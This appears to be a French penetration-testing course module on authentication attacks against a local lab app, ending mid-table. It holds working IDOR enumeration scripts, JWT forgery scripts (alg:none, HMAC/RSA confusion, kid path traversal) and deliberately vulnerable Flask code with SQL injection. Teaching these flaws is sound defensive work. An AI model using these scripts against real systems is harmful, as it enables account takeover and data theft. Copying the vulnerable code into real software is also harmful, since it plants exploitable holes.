# Module 3 — Authentification & Logique Métier

**Durée :** 1h00 (13:30—14:30)
**Tag MITRE ATT&CK :** T1078, T1134, T1548, T1068
**Référentiel :** NIS2 (Art. 21), OWASP Top 10 (A1, A4, A7)

---

## Table des matières

1. [Broken Access Control — IDOR](#1-broken-access-control--idor)
2. [Attaques JWT](#2-attaques-jwt)
3. [2FA Bypass & OAuth Flaws](#3-2fa-bypass--oauth-flaws)
4. [Race Conditions & TOCTOU](#4-race-conditions--toctou)
5. [Logique Métier — Workflow Abuse](#5-logique-métier--workflow-abuse)
6. [TP Synthèse](#6-tp-synthèse)

---

## 1. Broken Access Control — IDOR

### 1.1 Qu'est-ce que l'IDOR ?

**IDOR** (Insecure Direct Object Reference) est une vulnérabilité de contrôle d'accès qui survient lorsqu'une application expose une référence directe à un objet interne (ID, numéro de compte, clé) sans vérifier que l'utilisateur est autorisé à accéder à cet objet.

**Principe :** L'attaquant modifie un paramètre dans la requête (URL, body JSON, cookie) pour accéder à une ressource qui ne lui appartient pas.

```
GET /api/profile/2  →  profil de l'utilisateur courant (autorisé)
GET /api/profile/1  →  profil de l'admin (NON autorisé → IDOR !)
```

**Tag MITRE ATT&CK :**

| Technique | ID | Description |
|-----------|----|-------------|
| Abuse Elevation Control Mechanism | T1548 | Contournement des mécanismes d'élévation |
| Access Token Manipulation | T1134 | Manipulation de jetons pour usurper une identité |

### 1.2 Vecteurs d'attaque IDOR

#### 1.2.1 IDOR sur paramètres numériques

Le cas le plus simple : l'identifiant est un entier séquentiel.

```http
GET /api/profile/3 HTTP/1.1
Host: localhost:8080
Cookie: token=eyJ...

# L'attaquant incrémente l'ID : 1, 2, 3, 4...
```

**Détection :** Utiliser Burp Suite Intruder avec une payload `Numbers` de 1 à 100. Observer les réponses `200 OK` vs `403`/`404`.

#### 1.2.2 IDOR sur UUID

Même principe, mais l'identifiant est un UUID universel.

```http
GET /api/document/550e8400-e29b-41d4-a716-446655440000 HTTP/1.1
```

**Détection :** Si un UUID est exposé dans une réponse (ex. email, notification), il peut être réutilisé sur un autre compte. Collecter tous les UUID visibles et les tester.

#### 1.2.3 IDOR sur paramètres cachés

L'IDOR ne se limite pas aux URL : il peut se trouver dans :

- **Headers personnalisés :** `X-User-ID: 2`
- **Body JSON :** `{"user_id": 2, "action": "delete"}`
- **Cookies :** `userId=2`
- **Paramètres POST :** `user[id]=2`

```http
POST /api/delete-account HTTP/1.1
Content-Type: application/json

{
    "user_id": 2,
    "confirm": true
}
```

L'attaquant change `user_id` en `1` pour supprimer le compte admin.

### 1.3 Élévation horizontale vs verticale

| Critère | Horizontale | Verticale |
|---------|-------------|-----------|
| **Définition** | Accès aux données d'un autre utilisateur de même niveau | Accès à des fonctionnalités ou données d'un niveau supérieur (admin) |
| **Exemple** | `user A` lit les emails de `user B` | `user` exécute une action `admin` |
| **Impact** | Fuite de données, privacy | Prise de contrôle totale |
| **ID ATT&CK** | T1548 | T1134 |
| **Détection** | Anomalies dans les accès ressources par utilisateur | Requêtes vers des endpoints admin sans privilèges |
| **Remédiation** | Vérifier l'appartenance de la ressource à l'utilisateur | Vérifier le rôle avant chaque action sensible |

### 1.4 NIS2 & Authentification

La directive **NIS2 (UE 2022/2555)** — transposée en France par l'ANSSI — impose à l'**Article 21** des mesures de gestion des risques, notamment :

**Exigences applicables :**

1. **Contrôle d'accès stricte** (Art. 21(2)(c)) : « Les États membres veillent à ce que les entités prennent des mesures techniques, opérationnelles et organisationnelles appropriées [...] pour prévenir ou minimiser l'impact des incidents. »
   - Mise en œuvre : RBAC (Role-Based Access Control) vérifié côté serveur, jamais côté client.

2. **Gestion des identités** (Art. 21(2)(d)) : Politiques de mots de passe, MFA, revue des accès.
   - Mise en œuvre : Principe du moindre privilège — un utilisateur ne doit accéder qu'aux ressources nécessaires à sa tâche.

3. **Journalisation et détection** (Art. 21(2)(e)) : Surveillance des accès anormaux.
   - Mise en œuvre : Logs d'accès, alertes sur les IDOR détectés, corrélation SIEM.

### 1.5 TP Guidé — IDOR sur `/api/profile/{id}`

**Objectif :** Lire le profil de l'administrateur en exploitant un IDOR sur le endpoint `/api/profile/{id}`.

**Lab :** http://localhost:8080

**Étape 1 — Connexion à l'application**

# === EXÉCUTER SUR LA MACHINE ATTAQUANTE (Kali) ===
```bash
# Connexion avec le compte utilisateur standard 'user' — première étape de tout test d'authentification
# -c /tmp/cookies.txt : sauvegarde les cookies de session (contenant le JWT) dans un fichier
#   pour les réutiliser dans les requêtes suivantes sans reconnexion
# -X POST : force la méthode HTTP POST, requise pour soumettre le formulaire de login
# -d "email=...&password=..." : envoie les identifiants dans le corps de la requête
# -L : suit les redirections HTTP 302 pour atteindre la page d'accueil après connexion
curl -c /tmp/cookies.txt -X POST http://localhost:8080/login \
  -d "email=user@ecovault.com&password=User2026!" \
  -L
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `curl` | Client HTTP en ligne de commande. Indispensable pour tester manuellement des API REST dans un contexte de pentest. |
| `-c /tmp/cookies.txt` | (cookie-jar) Écrit les cookies reçus du serveur dans le fichier spécifié. Le JWT d'authentification est ainsi persisté. |
| `-X POST` | (request method) Spécifie la méthode HTTP POST pour envoyer des données dans le corps de la requête. |
| `-d "email=...&password=..."` | (data) Données du formulaire en `application/x-www-form-urlencoded`. Contient les identifiants du compte standard fourni par le lab. |
| `-L` | (location) Suit les redirections HTTP. Sans `-L`, curl affiche la réponse 302 sans follow. |

**Étape 2 — Lire son propre profil**

```bash
# Lecture du profil utilisateur — on lit notre propre profil (ID=2) pour confirmer que la session fonctionne
# -b /tmp/cookies.txt : (cookie-read) envoie les cookies stockés (dont le JWT) dans la requête HTTP
#   pour s'authentifier auprès de l'API ; sans cookie, le serveur renverrait 401 Unauthorized
# /api/profile/2 : endpoint REST renvoyant les informations du profil dont l'ID est 2
curl -b /tmp/cookies.txt http://localhost:8080/api/profile/2
```

Réponse :

```json
{
    "id": 2,
    "email": "user@ecovault.com",
    "role": "user",
    "api_key": null,
    "created_at": "2026-06-01T08:00:00"
}
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `curl -b /tmp/cookies.txt` | (cookie-read) Lit le fichier de cookies et les envoie dans la requête HTTP. Le JWT précédemment stocké est transmis automatiquement. |
| `http://localhost:8080/api/profile/2` | Endpoint GET de l'API renvoyant les détails du profil d'ID 2. L'ID 2 correspond au compte `user@ecovault.com` qui vient de se connecter. |


**Étape 3 — Exploiter l'IDOR pour lire le profil admin**

```bash
# Attaque IDOR : on modifie l'ID dans l'URL pour accéder au profil d'un autre utilisateur
# -b /tmp/cookies.txt : réutilise la session JWT du compte user (qui n'est PAS admin)
# /api/profile/1 : on change l'ID de 2 (user) → 1 (admin) ; c'est le cœur de l'attaque IDOR
# Le endpoint ne vérifie PAS que l'ID demandé correspond à l'utilisateur connecté
curl -b /tmp/cookies.txt http://localhost:8080/api/profile/1
```

Réponse :

```json
{
    "id": 1,
    "email": "admin@ecovault.com",
    "role": "admin",
    "api_key": "flag{admin_api_key_4a7b9c}",
    "created_at": "2026-06-01T08:00:00"
}
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `curl -b /tmp/cookies.txt` | Réutilise la session JWT du compte `user@ecovault.com` sans se réauthentifier. |
| `http://localhost:8080/api/profile/1` | Requête GET avec l'ID 1 (admin) au lieu de l'ID 2 (user). Le serveur ne compare pas l'ID demandé avec l'ID de l'utilisateur connecté — vulnérabilité IDOR. |
| Réponse | Le serveur renvoie le profil admin complet, incluant la clé API `flag{admin_api_key_4a7b9c}` qui est le flag à capturer. |


**Étape 4 — Automatisation avec un script Python**

```bash
# Sauvegarder le script d'énumération IDOR :
cat > idor_enum.py << 'PYEOF'
```

```python
#!/usr/bin/env python3
"""
Script d'automatisation IDOR — Extraction de tous les profils utilisateurs.
Automatise la découverte d'IDOR en bruteforçant les IDs de 1 à 6.
"""
import requests

# URL de base du laboratoire
BASE = "http://localhost:8080"

# Crée une session HTTP persistante (maintient les cookies automatiquement)
session = requests.Session()

# Connexion initiale avec le compte user standard
# La session retient le JWT pour toutes les requêtes suivantes
session.post(f"{BASE}/login", data={
    "email": "user@ecovault.com",
    "password": "User2026!"
})

# Bruteforce des IDs de 1 à 6 — exploitation systématique de l'IDOR
# Si le serveur ne vérifie pas l'appartenance, on obtient tous les profils
for user_id in range(1, 7):
    resp = session.get(f"{BASE}/api/profile/{user_id}")
    if resp.status_code == 200:
        data = resp.json()
        print(f"[+] ID {user_id}: {data.get('email')} — rôle: {data.get('role')} — API key: {data.get('api_key')}")
    else:
        print(f"[-] ID {user_id}: {resp.status_code}")
```

PYEOF

**Explication du script Python :**
| Élément | Rôle/Explication |
|------|------|
| `#!/usr/bin/env python3` | Shebang : indique au système d'utiliser l'interpréteur Python 3. |
| `import requests` | Importe la bibliothèque `requests` pour effectuer des requêtes HTTP. Standard en Python pour interagir avec des API REST. |
| `requests.Session()` | Crée une session persistante. Les cookies (dont le JWT) sont conservés automatiquement entre les appels, simulant un navigateur. |
| `session.post(...)` | Envoie une requête POST de connexion. Le JWT reçu est stocké dans la session. |
| `range(1, 7)` | Boucle sur les IDs 1 à 6. En production, on bruteforcerait une plage plus large. |
| `session.get(...)` | Envoie une requête GET avec le JWT de la session. Le endpoint `/api/profile/{id}` est interrogé pour chaque ID. |
| `resp.status_code == 200` | Vérifie si la requête a réussi (HTTP 200 OK). Un code différent (403, 404) indique un accès refusé. |
| `resp.json()` | Parse la réponse JSON en dictionnaire Python pour extraire les champs `email`, `role`, `api_key`. |
| `data.get('api_key')` | Récupère la clé API — l'objectif de l'attaque : capturer les flags dans les clés API. |

```bash
# Exécution du script Python d'énumération IDOR
# Le script se connecte, puis bruteforce les profils de 1 à 6
# Résultat : tous les profils (dont admin) sont exposés
python3 idor_enum.py
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `python3` | Interpréteur Python 3. Exécute le fichier `.py` passé en argument. |
| `idor_enum.py` | Script d'automatisation qui exploite l'IDOR pour extraire tous les profils utilisateurs. |


Résultat attendu :

```
[+] ID 1: admin@ecovault.com — rôle: admin — API key: flag{admin_api_key_4a7b9c}
[+] ID 2: user@ecovault.com — rôle: user — API key: None
[+] ID 3: alice@ecovault.com — rôle: user — API key: flag{alice_api_key_2f8e1d}
[+] ID 4: bob@ecovault.com — rôle: user — API key: None
[+] ID 5: charlie@ecovault.com — rôle: user — API key: None
[+] ID 6: eve@ecovault.com — rôle: user — API key: flag{eve_api_key_9c3b7a}
```

**Étape 5 — Analyser la vulnérabilité dans le code**

```python
# Extrait de app.py — ligne 234-241
# Route Flask : /api/profile/<int:user_id>
# <int:user_id> : convertit le paramètre URL en entier Python
@app.route('/api/profile/<int:user_id>')
def api_profile(user_id):
    """T1548 / T1134 — IDOR — Aucune vérification d'appartenance"""
    # ⚠️ IDOR — Pas de vérification que user_id == utilisateur connecté
    # La faille : on devrait extraire l'ID depuis le JWT et le comparer à user_id
    # Requête SQL non paramétrée : vulnérable à l'injection SQL également
    # f-string dans une requête SQL = injection SQL possible
    user = query_db(f"SELECT id, email, role, api_key, created_at FROM users WHERE id={user_id}", one=True)
    if user:
        return jsonify(user)
    return jsonify({'error': 'Utilisateur non trouvé'}), 404
```

**Explication du code vulnérable :**
| Élément | Rôle/Explication |
|------|------|
| `@app.route('/api/profile/<int:user_id>')` | Décorateur Flask : associe l'URL `/api/profile/{id}` à la fonction. `<int:user_id>` convertit automatiquement le paramètre en entier. |
| `def api_profile(user_id)` | Fonction handler. L'argument `user_id` vient directement de l'URL, sans aucune vérification d'autorisation. |
| `f"SELECT ... WHERE id={user_id}"` | **Faille 1 - Injection SQL** : La variable `user_id` est interpolée directement dans la requête SQL via une f-string, au lieu d'utiliser un paramètre préparé (`?` ou `%s`). |
| `one=True` | Option de `query_db` : ne retourne qu'un seul enregistrement (ou `None`). |
| `return jsonify(user)` | **Faille 2 - IDOR** : Renvoie les données sans vérifier que `user_id` correspond à l'utilisateur authentifié via le JWT. Aucune comparaison avec `current_user.id`. |

**Flag obtenu :** `flag{admin_api_key_4a7b9c}`

---

## 2. Attaques JWT

### 2.1 Rappel structure JWT

Le **JSON Web Token (JWT)** est un format d'échange de jetons (RFC 7519) composé de trois parties séparées par des points (`.`).

```
base64(Header).base64(Payload).base64(Signature)
```

#### Header (en-tête)

```json
{
    "alg": "HS256",
    "typ": "JWT",
    "kid": "key1"
}
```

- `alg` : algorithme de signature (HS256, RS256, none)
- `typ` : type du token (généralement "JWT")
- `kid` : Key ID — identifiant de la clé à utiliser (optionnel)

#### Payload (corps)

```json
{
    "user_id": 2,
    "email": "user@ecovault.com",
    "role": "user",
    "kid": "key1",
    "iat": 1717200000,
    "exp": 1717203600
}
```

- Contient les **claims** (revendications) : identité, rôles, permissions
- `iat` (issued at) : date d'émission
- `exp` (expiration) : date d'expiration

#### Signature

```text
HMACSHA256(
    base64UrlEncode(header) + "." + base64UrlEncode(payload),
    secret_key
)
```

La signature garantit l'intégrité du token : si le payload est modifié, la signature ne correspond plus.

**Tag MITRE ATT&CK :**

| Technique | ID | Description |
|-----------|----|-------------|
| Valid Accounts | T1078 | Utilisation de comptes valides |
| Access Token Manipulation | T1134 | Forge/modification de jetons d'accès |

### 2.2 Attaque 1 — None Algorithm

**Principe :** L'algorithme `none` signifie que le JWT n'est pas signé. Si le serveur ne vérifie pas cette valeur, l'attaquant peut modifier le payload et supprimer la signature.

#### Déroulement

**Étape 1 — Obtenir un JWT légitime**

# === EXÉCUTER SUR LA MACHINE ATTAQUANTE (Kali) ===
```bash
# Étape 1 : Connexion et capture du token JWT
# -c /tmp/cookies.txt : sauvegarde les cookies (contenant le JWT) dans un fichier
# -X POST : méthode HTTP pour soumettre le formulaire de connexion
# -d : envoie les identifiants du compte user dans le corps de la requête
curl -c /tmp/cookies.txt -X POST http://localhost:8080/login \
  -d "email=user@ecovault.com&password=User2026!" \
  -L

# Étape 2 : Extraction du JWT depuis le cookie
# grep token : filtre les lignes contenant "token" dans le fichier cookies
# awk '{print $NF}' : imprime le dernier champ (colonne) de la ligne — c'est la valeur du JWT
# $NF signifie "Number of Fields" — la dernière colonne contient la valeur du cookie
grep token /tmp/cookies.txt | awk '{print $NF}'
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `curl -c /tmp/cookies.txt -X POST ... -L` | Se connecte à l'application et stocke le cookie de session (JWT) dans `/tmp/cookies.txt`. |
| `grep token /tmp/cookies.txt` | Filtre la ligne contenant "token" dans le fichier cookies. Le format Netscape cookie file a une ligne par cookie. |
| `awk '{print $NF}'` | Extrait la dernière colonne de la ligne filtrée. Dans le format cookie, la 7e colonne est la valeur. `$NF` désigne toujours le dernier champ. |


**Étape 2 — Analyser le JWT sur jwt.io**

Ouvrir https://jwt.io et coller le token. L'interface décode les trois parties.

On obtient :

```
HEADER:  {"alg":"HS256","typ":"JWT"}
PAYLOAD: {"user_id":2,"email":"user@ecovault.com","role":"user","kid":"key1"}
```

**Étape 3 — Forger un token avec l'algorithme `none`**

```python
#!/usr/bin/env python3
"""
Forge un JWT avec l'algorithme 'none' pour devenir administrateur.
Principe : si le serveur accepte l'algorithme 'none', il ne vérifie PAS la signature.
"""
import base64
import json

def b64encode(data):
    """Base64 URL-safe encoding sans padding.
    - urlsafe_b64encode : utilise - et _ au lieu de + et / (standard JWT)
    - rstrip(b'=') : supprime le padding '==' (non utilisé dans les JWT)
    """
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

# Header modifié avec alg: none
# L'algorithme 'none' signifie que le JWT n'est PAS signé
header = {"alg": "none", "typ": "JWT"}

# Payload modifié — user_id=1, role=admin
# On usurpe l'identité de l'administrateur
payload = {
    "user_id": 1,
    "email": "admin@ecovault.com",
    "role": "admin"
}

# Token sans signature (on s'arrête après le payload)
# Le format JWT est : header.payload.signature
# Ici, la partie signature est vide (rien après le dernier point)
token = f"{b64encode(header)}.{b64encode(payload)}."

print(f"Token forgé (none algorithm) :\n{token}")
```

**Explication du script Python :**
| Élément | Rôle/Explication |
|------|------|
| `base64.urlsafe_b64encode(...)` | Encode en Base64 URL-safe (RFC 4648 §5). Utilise `-` et `_` au lieu de `+` et `/`. |
| `.rstrip(b'=')` | Supprime le padding `=` obligatoire du Base64 standard. Le JWT n'utilise pas de padding. |
| `json.dumps(data).encode()` | Convertit le dictionnaire Python en chaîne JSON, puis en bytes pour l'encodage Base64. |
| `header = {"alg": "none", "typ": "JWT"}` | Définit l'algorithme `none` — le serveur ne doit PAS vérifier la signature. `typ` indique le type JWT. |
| `payload = {"user_id": 1, "role": "admin"}` | Payload forgé : on se fait passer pour l'admin (ID 1, rôle admin). |
| `f"{b64encode(header)}.{b64encode(payload)}."` | Concatène header et payload encodés, suivis d'un point final (signature vide). |

```bash
# Exécution du script de forge JWT avec algorithme 'none'
# Le script génère un token JWT valide sans signature
python3 jwt_none_forge.py
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `python3 jwt_none_forge.py` | Lance le script Python qui forge un JWT avec `alg: none`. Le token obtenu est utilisable si le serveur ne rejette pas l'algorithme `none`. |


**Étape 4 — Tester le token forgé**

```bash
# Étape 4 : Tester le token forgé (none algorithm)
# -X GET : méthode HTTP GET pour récupérer la page dashboard
# -b "token=..." : envoie le JWT forgé (sans signature) comme cookie nommé "token"
# Le JWT contient le header {"alg":"none"} et le payload {"role":"admin"}
# Si le serveur accepte alg:none, il nous verra comme admin sans vérifier la signature
curl -X GET http://localhost:8080/dashboard \
  -b "token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImFkbWluQGVjb3ZhdWx0LmNvbSIsInJvbGUiOiJhZG1pbiJ9."
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `-X GET` | Méthode HTTP GET pour récupérer une ressource (page dashboard). |
| `-b "token=..."` | Envoie un cookie HTTP nommé `token` avec la valeur du JWT forgé. Le serveur lit ce cookie pour authentifier la requête. |

**Étape 5 — Accéder aux fonctionnalités admin**

```bash
# Test d'accès à l'interface admin avec le JWT forgé (none algorithm)
# /admin/templates : endpoint réservé aux administrateurs
# Si le JWT forgé est accepté, on accède à des fonctionnalités admin normalement interdites
# -b "token=..." : même token JWT sans signature
curl -X GET http://localhost:8080/admin/templates \
  -b "token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImFkbWluQGVjb3ZhdWx0LmNvbSIsInJvbGUiOiJhZG1pbiJ9."
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `curl -X GET http://localhost:8080/admin/templates` | Requête GET vers le endpoint admin. `/admin/templates` est une ressource protégée qui nécessite le rôle admin. |
| `-b "token=<JWT>"` | Transmet le JWT forgé. Si la vulnérabilité `alg: none` est présente, le serveur nous authentifie comme admin. |


#### Analyse du code vulnérable

```python
# Extrait de app.py — ligne 252-254
# Vérification du champ 'alg' dans l'en-tête du JWT
# Si l'algorithme est 'none', le code désactive la vérification de signature
# C'est une erreur critique : un attaquant peut modifier le payload sans signature
if header.get('alg') == 'none':
    # Attaque "none algorithm"
    # options={"verify_signature": False} : désactive la vérification cryptographique
    # Le token est décodé sans valider l'intégrité du payload
    return jwt.decode(token, options={"verify_signature": False})
```

**Explication du code vulnérable :**
| Élément | Rôle/Explication |
|------|------|
| `header.get('alg')` | Récupère la valeur du champ `alg` dans l'en-tête du JWT. La méthode `.get()` évite une erreur si la clé n'existe pas. |
| `== 'none'` | Teste si l'algorithme est `none`. Un serveur sécurisé rejette **toujours** `alg: none`. |
| `jwt.decode(token, options={"verify_signature": False})` | Désactive explicitement la vérification de signature. Le token est décodé sans validation — n'importe quel payload modifié est accepté. |


### 2.3 Attaque 2 — HMAC/RSA Confusion

**Principe :** Le serveur utilise normalement une paire de clés RSA (publique/privée). L'attaquant récupère la clé publique (souvent exposée via un endpoint) et l'utilise comme secret HMAC pour signer un nouveau token avec l'algorithme `HS256`.

```
Scénario normal :
  Serveur signe avec clé privée (RS256) → Client vérifie avec clé publique

Attaque :
  Attaquant signe avec clé publique (HS256) → Serveur vérifie avec clé publique
  (Confusion entre asymétrique et symétrique)
```

**Étape 1 — Récupérer la clé publique RSA**

```bash
# Récupération de la clé publique RSA via l'API du serveur
# Le endpoint /api/jwt-info expose la configuration JWT du serveur
# Cette clé publique est normalement utilisée pour VÉRIFIER les signatures RS256
# Mais l'attaquant va l'utiliser pour SIGNER un token avec HS256 (confusion HMAC/RSA)
# La clé publique n'est PAS un secret — elle est conçue pour être partagée
curl http://localhost:8080/api/jwt-info
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `curl http://localhost:8080/api/jwt-info` | Requête GET vers le endpoint d'information JWT. Le serveur renvoie la clé publique RSA, l'algorithme attendu et une note descriptive. C'est une fuite d'information qui rend l'attaque HMAC/RSA confusion possible. |


Réponse :

```json
{
    "public_key": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0Z3VS5JJcd0xBXh0w16f\nwLM8m5l8JqQfLpKzPq5n3bR6wX0hYsT8vK3mN1bR4qWxZ5jL9pM2cR7vS8tY0aB1\nnK4xQ6zJ9wV3mD5fH8jL2pR7tY0bN1kQ4wX6zJ9mV3pR5fH8jL2tY0bN1kQ4wX6\nzJ9mV3pR5fH8jL2tY0bN1kQ4wX6zJ9mV3pR5fH8jL2tY0bN1kQ4wX6zJ9mV3pR5\nfH8jL2tY0bN1kQ4wX6zJ9mV3pR5fH8jL2tY0bN1kQ4wX6zJ9mV3pR5fH8jL2tY0\nbN1kQ4wX6zJ9mV3pR5fH8jL2tY0bN1kQ4wX6zJ9mV3pR5fH8jL2tY0bN1kQ4wX6\nzQIDAQAB\n-----END PUBLIC KEY-----",
    "algorithm": "RS256",
    "note": "Clé publique utilisée pour la vérification des signatures JWT"
}
```

**Étape 2 — Forger un token avec la clé publique comme secret HMAC**

```python
#!/usr/bin/env python3
"""
Forging JWT — HMAC/RSA confusion attack.
Utilise la clé publique RSA comme secret HMAC.
Principe : le serveur accepte à la fois RS256 (asymétrique) et HS256 (symétrique)
Si l'attaquant signe avec HS256 en utilisant la clé publique comme secret,
le serveur vérifie avec la même clé publique — et la signature est valide.
"""
import jwt
import requests

# Récupérer la clé publique depuis l'API du serveur
# Le endpoint /api/jwt-info expose la clé publique sans authentification
resp = requests.get("http://localhost:8080/api/jwt-info")
public_key = resp.json()["public_key"]

# Forger le payload avec le rôle admin
# On se fait passer pour l'administrateur (user_id=1, role=admin)
payload = {
    "user_id": 1,
    "email": "admin@ecovault.com",
    "role": "admin"
}

# Signer avec HS256 en utilisant la clé PUBLIQUE comme secret !
# Normalement : RS256 utilise clé privée pour signer, clé publique pour vérifier
# Attaque : on utilise HS256 (symétrique) avec la clé publique comme secret partagé
# Le serveur utilise la même clé publique pour vérifier — la signature passe
token = jwt.encode(payload, public_key, algorithm="HS256")

print(f"Token forgé (HMAC/RSA confusion) :\n{token}")
```

**Explication du script Python :**
| Élément | Rôle/Explication |
|------|------|
| `import jwt` | PyJWT : bibliothèque Python pour encoder et décoder les JWT. Supporte les algorithmes HS256, RS256, etc. |
| `import requests` | Bibliothèque HTTP pour récupérer la clé publique depuis l'API. |
| `resp.json()["public_key"]` | Extrait la clé publique RSA de la réponse JSON du endpoint `/api/jwt-info`. |
| `jwt.encode(payload, public_key, algorithm="HS256")` | **Cœur de l'attaque** : signe le payload avec l'algorithme HMAC-SHA256 (symétrique) en utilisant la **clé publique RSA** comme secret. L'attaque fonctionne car le serveur vérifie avec la même clé. |
| `algorithm="HS256"` | HMAC avec SHA-256. Algorithme symétrique : la même clé sert à signer et vérifier. L'attaquant force l'utilisation de HS256 au lieu de RS256. |

```bash
# Installation des dépendances Python nécessaires
# pyjwt : bibliothèque de manipulation JWT (signature, encodage, décodage)
# requests : bibliothèque HTTP pour les appels API
# === EXÉCUTER SUR LA MACHINE ATTAQUANTE ===
python3 -m pip install --user pyjwt requests

# Exécution du script d'attaque HMAC/RSA confusion
# Le script forge un token JWT signé avec la clé publique via HS256
python3 jwt_hmac_rsa_confusion.py
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `pip3 install pyjwt requests` | Installe les bibliothèques Python `pyjwt` (manipulation JWT) et `requests` (HTTP) via le gestionnaire de paquets pip. |
| `python3 jwt_hmac_rsa_confusion.py` | Exécute le script d'attaque. Le token forgé est affiché et peut être utilisé pour accéder aux ressources admin. |


**Étape 3 — Tester le token forgé**

```bash
# Test du token forgé par HMAC/RSA confusion
# -X GET : requête HTTP vers le dashboard
# -b "token=PASTE_YOUR_TOKEN_HERE" : remplacez par le token généré par le script Python
# Si l'attaque réussit, le serveur nous authentifie comme admin
curl -X GET http://localhost:8080/dashboard \
  -b "token=PASTE_YOUR_TOKEN_HERE"
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `curl -X GET http://localhost:8080/dashboard` | Requête GET vers le dashboard. Le serveur vérifie le rôle dans le JWT pour autoriser l'accès. |
| `-b "token=PASTE_YOUR_TOKEN_HERE"` | Envoie le JWT forgé comme cookie. Remplacez `PASTE_YOUR_TOKEN_HERE` par la valeur générée par le script Python. |

#### Analyse du code vulnérable

```python
# Extrait de app.py — ligne 271-279
# Vérification de l'algorithme JWT dans l'en-tête
if header.get('alg') == 'RS256':
    try:
        # Tentative de vérification avec RS256 (asymétrique : clé publique)
        # Si le token est signé avec la clé privée RSA, cette vérification passe
        return jwt.decode(token, RSA_PUBLIC_KEY, algorithms=['RS256'])
    except jwt.InvalidSignatureError:
        # Si RS256 échoue (signature invalide), le code essaie HS256
        # avec la MÊME clé publique comme secret HMAC !
        # C'est l'erreur : une clé publique RSA ne devrait JAMAIS être utilisée
        # comme secret HMAC. Cela permet l'attaque HMAC/RSA confusion.
        try:
            return jwt.decode(token, RSA_PUBLIC_KEY, algorithms=['HS256'])
        except Exception:
            pass
```

**Explication du code vulnérable :**
| Élément | Rôle/Explication |
|------|------|
| `header.get('alg') == 'RS256'` | Vérifie si l'algorithme annoncé est RS256. C'est le cas attendu pour un token légitime. |
| `jwt.decode(token, RSA_PUBLIC_KEY, algorithms=['RS256'])` | Tente de vérifier le token avec RS256 (algorithme asymétrique). Nécessite la clé privée pour signer, la clé publique pour vérifier. |
| `jwt.InvalidSignatureError` | Exception levée quand la signature ne correspond pas (token forgé ou modifié). |
| `jwt.decode(token, RSA_PUBLIC_KEY, algorithms=['HS256'])` | **Vulnérabilité** : essaie HS256 (symétrique) avec la même clé publique comme secret. L'attaquant peut signer son token avec la clé publique en utilisant HS256 — la vérification réussit. |


### 2.4 Attaque 3 — Kid Injection

**Principe :** Le paramètre `kid` (Key ID) dans l'en-tête JWT est utilisé pour sélectionner la clé de vérification. Si l'application lit le fichier pointé par `kid` sans le valider, l'attaquant peut :

- Faire un **path traversal** : `kid: ../../dev/null` → clé vide
- Faire une **SQL injection** : `kid: " UNION SELECT 'secret' -- ` → clé arbitraire

**Étape 1 — Forger un token avec `kid` path traversal**

```python
#!/usr/bin/env python3
"""
Forging JWT — Kid injection via /dev/null (clé vide).
Principe : le paramètre 'kid' (Key ID) dans l'en-tête JWT est utilisé par le serveur
pour sélectionner la clé de vérification. Si le serveur lit le fichier pointé par 'kid',
l'attaquant peut faire un path traversal vers /dev/null pour obtenir une clé vide.
"""
import jwt

# Header avec kid pointant vers /dev/null
# kid = "/dev/null" : le serveur va lire ce fichier comme clé de signature
# /dev/null est un fichier spécial Linux qui retourne une chaîne vide
# Si le serveur utilise le contenu comme clé HMAC, la clé est vide ("")
header = {"alg": "HS256", "typ": "JWT", "kid": "/dev/null"}

# Payload admin — on se fait passer pour l'administrateur
payload = {
    "user_id": 1,
    "email": "admin@ecovault.com",
    "role": "admin"
}

# Le serveur lit /dev/null → chaîne vide comme clé
# jwt.encode avec secret="" (chaîne vide) et algorithm="HS256"
# Le serveur lira /dev/null, obtiendra "" (vide), et vérifiera avec cette clé vide
token = jwt.encode(payload, "", algorithm="HS256", headers=header)

print(f"Token forgé (kid injection /dev/null) :\n{token}")
```

**Explication du script Python :**
| Élément | Rôle/Explication |
|------|------|
| `headers={"kid": "/dev/null"}` | Ajoute un champ `kid` dans l'en-tête JWT. Le serveur utilise `kid` pour localiser la clé de vérification — ici un path traversal vers `/dev/null`. |
| `jwt.encode(payload, "", algorithm="HS256")` | Signe le JWT avec une clé vide (`""`). Le serveur lit `/dev/null` qui retourne une chaîne vide — la signature correspond. |
| `algorithm="HS256"` | HMAC-SHA256. L'algorithme symétrique permet d'utiliser n'importe quelle chaîne comme clé (y compris vide). |

```bash
# Exécution du script de forge JWT par injection kid
# Le script génère un token JWT dont le kid pointe vers /dev/null
# Si le serveur lit le fichier pointé par kid, il utilise une clé vide
python3 jwt_kid_injection.py
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `python3 jwt_kid_injection.py` | Lance le script qui forge un JWT avec `kid: "/dev/null"`. Le token utilise une clé vide que le serveur reproduira en lisant `/dev/null`. |


**Étape 2 — Tester le token forgé**

```bash
# Test du token forgé par injection kid
# -X GET : requête HTTP vers le endpoint admin/debug
# -b "token=PASTE_TOKEN" : remplacez PASTE_TOKEN par le JWT généré
# /admin/debug : endpoint admin qui révèle des informations sensibles
curl -X GET http://localhost:8080/admin/debug \
  -b "token=PASTE_TOKEN"
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
